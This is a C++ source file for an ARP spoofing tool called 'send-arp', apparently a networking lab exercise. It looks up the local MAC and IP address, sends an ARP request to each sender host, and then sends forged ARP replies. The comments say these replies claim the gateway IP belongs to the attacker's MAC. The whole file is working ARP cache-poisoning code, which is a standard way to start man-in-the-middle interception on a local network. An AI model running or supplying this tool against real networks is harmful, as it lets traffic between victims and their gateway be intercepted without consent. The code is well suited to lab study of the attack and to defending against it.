#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)




void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


void send_arp(char *dev, char *sip, char *tip, char *mip, char *mmac) {
	
	char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                exit(-1);
        }
	int res = 0;

	
	EthArpPacket packet;

        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(mmac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(mmac);
        packet.arp_.sip_ = htonl(Ip(mip));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(sip)); // Normal ARP Request to sender 

	res = 0;
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

	pcap_pkthdr* header;
	const u_char* tpacket;
	res = 0;
	res = pcap_next_ex(handle, &header, &tpacket);
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		exit(-1);
	}

	EthArpPacket *arptpacket = (EthArpPacket*)tpacket;


	packet.eth_.dmac_ = arptpacket->eth_.smac_; // Sender MAC Address
        packet.eth_.smac_ = Mac(mmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(mmac); // poisoned MAC Address, not a gateway MAC but attacker's MAC
        packet.arp_.sip_ = htonl(Ip(tip)); //gateway IP
        packet.arp_.tmac_ = arptpacket->arp_.smac_;
        packet.arp_.tip_ = htonl(Ip(sip)); // ARP Reply to sender
	
	
	res = 0;
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        pcap_close(handle);

}



int main(int argc, char* argv[]) {
	if (argc < 4 || argc & 1) {
		usage();
		return -1;
	}

	// Get MAC Address and IP Address
	int sockfd;
    	struct ifreq ifr;
    	struct sockaddr_in* sa;
    	char mac_addr[18];

    	// Create a socket for the ioctl request
   	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
        	perror("socket");
        	exit(EXIT_FAILURE);
    	}

   	 // Get MAC address
   	 strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
  	 ifr.ifr_name[IFNAMSIZ - 1] = '\0';
	 if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
       		perror("ioctl (SIOCGIFHWADDR)");
    	   	close(sockfd);
        	exit(EXIT_FAILURE);
   	 }
    	snprintf(mac_addr, sizeof(mac_addr), "%02X:%02X:%02X:%02X:%02X:%02X",
        	(unsigned char)ifr.ifr_hwaddr.sa_data[0],
        	(unsigned char)ifr.ifr_hwaddr.sa_data[1],
          	(unsigned char)ifr.ifr_hwaddr.sa_data[2],
            	(unsigned char)ifr.ifr_hwaddr.sa_data[3],
             	(unsigned char)ifr.ifr_hwaddr.sa_data[4],
            	(unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    	printf("MAC Address: %s\n", mac_addr);

    	// Get IP address
    	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
    	ifr.ifr_name[IFNAMSIZ - 1] = '\0';
    	if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        	perror("ioctl (SIOCGIFADDR)");
       		close(sockfd);
        	exit(EXIT_FAILURE);
    	}
        sa = (struct sockaddr_in*)&ifr.ifr_addr;
	printf("IP Address: %s\n", inet_ntoa(sa->sin_addr));

        // Close the socket
	close(sockfd);


	for (int i = 2; i < argc; i = i+2){
		send_arp(argv[1], argv[i], argv[i+1], inet_ntoa(sa->sin_addr), mac_addr);
	}
	
}
